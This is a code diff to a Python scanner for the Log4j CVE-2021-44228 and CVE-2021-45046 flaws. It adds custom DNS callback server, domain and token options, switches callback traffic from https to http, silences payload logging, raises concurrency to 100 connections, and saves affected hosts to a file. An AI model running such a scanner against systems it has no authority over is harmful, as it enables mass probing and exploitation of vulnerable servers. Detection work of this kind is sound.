@@ -23,6 +23,8 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+from pathlib import Path
+from datetime import datetime
 import httpx
 import asyncio
 import pprint
@@ -128,6 +130,14 @@ parser.add_argument("--custom-dns-callback-host",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
+parser.add_argument("--custom-dns-callback-domain",
+                    dest="custom_dns_callback_domain",
+                    help="Custom DNS Callback Domain. Defaults to value set by --custom-dns-callback-host value.",
+                    action='store')
+parser.add_argument("--custom-dns-callback-token",
+                    dest="custom_dns_callback_token",
+                    help="Custom DNS Callback Auth Token.",
+                    action='store')
 parser.add_argument("--disable-http-redirects",
                     dest="disable_redirects",
                     help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
@@ -197,12 +207,12 @@ class Dnslog(object):
 
 class Interactsh:
     # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
-    def __init__(self, token="", server=""):
+    def __init__(self, token="", server="", domain_postfix=""):
         rsa = RSA.generate(2048)
         self.public_key = rsa.publickey().exportKey()
         self.private_key = rsa.exportKey()
         self.token = token
-        self.server = server.lstrip('.') or 'interact.sh'
+        self.server = server or "interact.sh"
         self.headers = {
             "Content-Type": "application/json",
         }
@@ -212,13 +222,15 @@ class Interactsh:
         self.encoded = b64encode(self.public_key).decode("utf8")
         guid = uuid4().hex.ljust(33, 'a')
         guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
-        self.domain = f'{guid}.{self.server}'
+        self.domain_postfix = domain_postfix or self.server
+        self.domain = f'{guid}.{self.domain_postfix}'
         self.correlation_id = self.domain[:20]
 
         self.session = requests.session()
         self.session.headers = self.headers
         self.session.verify = False
         self.session.proxies = proxies
+        print(f"Using server {self.server} with domain {self.domain}")
         self.register()
 
     def register(self):
@@ -228,13 +240,13 @@ class Interactsh:
             "correlation-id": self.correlation_id
         }
         res = self.session.post(
-            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
+            f"http://{self.server}/register", headers=self.headers, json=data, timeout=30)
         if 'success' not in res.text:
-            raise Exception("Can not initiate interact.sh DNS callback client")
+            raise Exception(f"Can not initiate interact.sh DNS callback client: {res}")
 
     def pull_logs(self):
         result = []
-        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
+        url = f"http://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
         res = self.session.get(url, headers=self.headers, timeout=30).json()
         aes_key, data_list = res['aes_key'], res['data']
         for i in data_list:
@@ -299,7 +311,7 @@ async def scan_url(url, callback_host, client: httpx.AsyncClient):
         payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
 
     for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        #cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
                 await client.request(url=url,
@@ -317,7 +329,7 @@ async def scan_url(url, callback_host, client: httpx.AsyncClient):
                 e_type = type(e)
                 errors.setdefault(e_type, 0)
                 errors[e_type] = errors[e_type] + 1
-                cprint(f"EXCEPTION: {e_type} {e}")
+                #cprint(f"EXCEPTION: {e_type} {e}")
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
@@ -337,7 +349,7 @@ async def scan_url(url, callback_host, client: httpx.AsyncClient):
                 e_type = type(e)
                 errors.setdefault(e_type, 0)
                 errors[e_type] = errors[e_type] + 1
-                cprint(f"EXCEPTION: {e_type} {e}")
+                #cprint(f"EXCEPTION: {e_type} {e}")
 
             try:
                 # JSON body
@@ -379,37 +391,42 @@ async def main():
 
     dns_callback_host = ""
     if args.custom_dns_callback_host:
-        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
+        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}, custom host {args.custom_dns_callback_host}).")
         dns_callback_host =  args.custom_dns_callback_host
+        dns_callback_domain = dns_callback_host
     else:
         cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
-        if args.dns_callback_provider == "interact.sh":
-            dns_callback = Interactsh()
-        elif args.dns_callback_provider == "dnslog.cn":
-            dns_callback = Dnslog()
-        else:
-            raise ValueError("Invalid DNS Callback provider")
-        dns_callback_host = dns_callback.domain
+    token = args.custom_dns_callback_token or ""
+    if args.custom_dns_callback_domain:
+        dns_callback_domain = args.custom_dns_callback_domain
+        print(f"Using using DNS callback domain {dns_callback_domain}")
+    if args.dns_callback_provider == "interact.sh":
+        dns_callback = Interactsh(token=token, server=dns_callback_host, domain_postfix=dns_callback_domain)
+    elif args.dns_callback_provider == "dnslog.cn":
+        # Warning: dnslog impl here does not support everything like token etc
+        dns_callback = Dnslog()
+    else:
+        raise ValueError("Invalid DNS Callback provider")
+    dns_callback_host = dns_callback.domain
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
+    processed = 0
     async with httpx.AsyncClient(
         verify=False, 
-        limits=httpx.Limits(max_connections=30, max_keepalive_connections=20),
+        limits=httpx.Limits(max_connections=100, max_keepalive_connections=80),
         timeout=timeout,
         ) as client:
         for url_chunk in chunks(urls, 1000):
             tasks = []
             for url in url_chunk:
                 tasks.append(asyncio.create_task(scan_url(url, dns_callback_host, client=client)))
+                processed += 1
             await asyncio.gather(*tasks)
+        print(f"Scanning: {processed}/{len(urls)}")
         
     cprint(f"Succeeded connections: {succeeded}", "magenta")
     cprint(f"Failures: \n{pprint.pformat(errors, width=4, indent=3)}", "magenta")
     
-
-    if args.custom_dns_callback_host:
-        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
-        return
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
     cprint("[•] Waiting...", "cyan")
@@ -421,6 +438,10 @@ async def main():
         cprint("[!!!] Target Affected", "yellow")
         for i in records:
             cprint(i, "yellow")
+        file = Path(f"affected.{datetime.now().strftime('%Y-%m-%d-%H:%M:%S')}.json")
+        print(f"Writing affected hosts to {file}")
+        with file.open("w") as f:
+            json.dump(records, f, indent=4)
 
 
 if __name__ == "__main__":
